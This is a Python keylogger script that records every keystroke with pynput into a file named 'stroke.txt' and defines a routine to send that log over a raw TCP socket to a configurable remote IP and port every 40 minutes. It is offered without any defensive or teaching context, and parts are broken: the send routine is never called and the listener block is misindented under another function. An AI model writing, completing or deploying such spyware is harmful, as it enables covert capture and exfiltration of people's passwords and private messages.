import socket
import os
import time

log_file_path = "stroke.txt"
server_ip = "127.0.0.1"  # Replace with the target IP address
server_port = 9999           # Replace with the target port number
send_interval = 40 * 60      # 40 minutes in seconds

# Open the log file in append mode at the start
log_file = open(log_file_path, 'a', buffering=1)  # Line-buffered for immediate write

def log_key(key):
    # Function to write keystrokes to the log file
    log_file.write(f'{key}\n')

def flush_and_send_log():
    # Flush the log file buffer to ensure all data is written to disk
    log_file.flush()
    os.fsync(log_file.fileno())
    
    # Check if the log file exists and has content
    if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:
        try:
            with open(log_file_path, 'rb') as f:
                data = f.read()
                
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server_ip, server_port))
                s.sendall(data)
                
            print("Log file sent successfully.")
        except Exception as e:
            print(f"Error sending log file: {e}")
    else:
        print("Log file is empty or does not exist.")

from pynput.keyboard import Key, Listener

from datetime import datetime


count = 0
keys = []

with open("stroke.txt","a") as f:
    f.write("\nTimestamp"+str(datetime.now())[:-7]+":\n")


def on_press(key):
    global count, keys
    keys.append(key)
    write_file(keys)
    keys = []

def on_release(key):
    if key == Key.esc:
        pass
    
def write_file(keys):
    with open("stroke.txt","a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'","")
            if k.find("space") > 0 and k.find("backspace") == 1:
                f.write("  ")
            elif k.find("Key") == -1:
                f.write(k)

#if __name__ == '__main__':
    with Listener(
        on_press = on_press,
        on_release = on_release)as listener:
        listener.join()


    with open("stroke.txt","a") as f:
        f.write("\n\n")
        f.write("-------------------------------------------------------------------")
        f.write("\n\n")
